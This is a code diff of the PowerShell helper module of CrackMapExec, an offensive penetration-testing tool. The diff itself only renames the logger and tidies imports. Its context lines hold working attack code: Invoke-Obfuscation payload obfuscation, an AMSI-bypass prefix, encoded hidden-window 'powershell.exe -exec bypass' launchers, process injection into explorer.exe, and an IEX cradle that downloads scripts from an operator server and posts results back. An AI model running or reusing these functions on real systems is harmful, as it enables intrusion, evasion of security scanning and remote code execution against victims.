@@ -3,31 +3,31 @@
 
 import cme
 import os
-import logging
 import re
-import tempfile
 from sys import exit
 from string import ascii_lowercase
-from random import choice, randrange, sample
-from subprocess import check_output, call
-from cme.helpers.misc import gen_random_string, which
-from cme.logger import CMEAdapter
+from random import choice, sample
+from subprocess import call
+from cme.helpers.misc import which
+from cme.logger import cme_logger
 from base64 import b64encode
 
-logger = CMEAdapter()
-
 obfuscate_ps_scripts = False
+
 
 def get_ps_script(path):
     return os.path.join(os.path.dirname(cme.__file__), 'data', path)
 
+
 def encode_ps_command(command):
     return b64encode(command.encode('UTF-16LE')).decode()
+
 
 def is_powershell_installed():
     if which('powershell'): 
         return True
     return False
+
 
 def obfs_ps_script(path_to_script):
     ps_script = path_to_script.split('/')[-1]
@@ -37,21 +37,21 @@ def obfs_ps_script(path_to_script):
     if is_powershell_installed() and obfuscate_ps_scripts:
 
         if os.path.exists(obfs_ps_script):
-            logger.display('Using cached obfuscated Powershell script')
+            cme_logger.display('Using cached obfuscated Powershell script')
             with open(obfs_ps_script, 'r') as script:
                 return script.read()
 
-        logger.display('Performing one-time script obfuscation, go look at some memes cause this can take a bit...')
+        cme_logger.display('Performing one-time script obfuscation, go look at some memes cause this can take a bit...')
 
         invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "TOKEN,ALL,1,OUT {}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                                  get_ps_script(path_to_script),
                                                                                                                                                  obfs_ps_script)
-        logger.debug(invoke_obfs_command)
+        cme_logger.debug(invoke_obfs_command)
 
         with open(os.devnull, 'w') as devnull:
             return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
 
-        logger.success('Script obfuscated successfully')
+        cme_logger.success('Script obfuscated successfully')
 
         with open(obfs_ps_script, 'r') as script:
             return script.read()
@@ -69,6 +69,7 @@ def obfs_ps_script(path_to_script):
             strippedCode = "\n".join([line for line in strippedCode.split('\n') if ((line.strip() != '') and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")) )])
 
             return strippedCode
+
 
 def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):
     if custom_amsi:
@@ -107,7 +108,7 @@ else
     else:
         command = amsi_bypass + ps_command
 
-    logger.debug('Generated PS command:\n {}\n'.format(command))
+    cme_logger.debug('Generated PS command:\n {}\n'.format(command))
 
     # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed concurrently
     # it would spawn a local powershell process per host which isn't ideal, until I figure out a good way of dealing with this 
@@ -128,11 +129,11 @@ else
             invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
                                                                                                                                               temp.name,
                                                                                                                                               encoding)
-            logger.debug(invoke_obfs_command)
+            cme_logger.debug(invoke_obfs_command)
             out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
 
             command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            logger.debug('Command length: {}'.format(len(command)))
+            cme_logger.debug('Command length: {}'.format(len(command)))
 
             if len(command) <= 8192:
                 temp.close()
@@ -150,17 +151,18 @@ else
                 break
 
             if obfs_attempts == 4:
-                logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
+                cme_logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
                 exit(1)
 
             obfs_attempts += 1
     else:
         command = 'powershell.exe -noni -nop -w 1 -enc {}'.format(encode_ps_command(command))
         if len(command) > 8191:
-            logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
+            cme_logger.error('Command exceeds maximum length of 8191 chars (was {}). exiting.'.format(len(command)))
             exit(1)
 
     return command
+
 
 def gen_ps_inject(command, context=None, procname='explorer.exe', inject_once=False):
     #The following code gives us some control over where and how Invoke-PSInject does its thang
@@ -199,6 +201,7 @@ if (($injected -eq $False) -or ($inject_once -eq $False)){{
         return gen_ps_iex_cradle(context, 'Invoke-PSInject.ps1', ps_code, post_back=False)
 
     return ps_code
+
 
 def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):
 
@@ -243,9 +246,10 @@ $request.GetResponse()'''.format(server=context.server,
                                   command=command)
                                   #second_cmd= second_cmd if second_cmd else '')
 
-    logger.debug('Generated PS IEX Launcher:\n {}\n'.format(launcher))
+    cme_logger.debug('Generated PS IEX Launcher:\n {}\n'.format(launcher))
 
     return launcher.strip()
+
 
 # Following was stolen from https://raw.githubusercontent.com/GreatSCT/GreatSCT/templates/invokeObfuscation.py
 def invoke_obfuscation(scriptString):
@@ -397,5 +401,4 @@ def invoke_obfuscation(scriptString):
 
     obfuscatedPayload = 'powershell.exe ' + commandlineOptions + newScript
     """
-
     return obfuscatedPayload
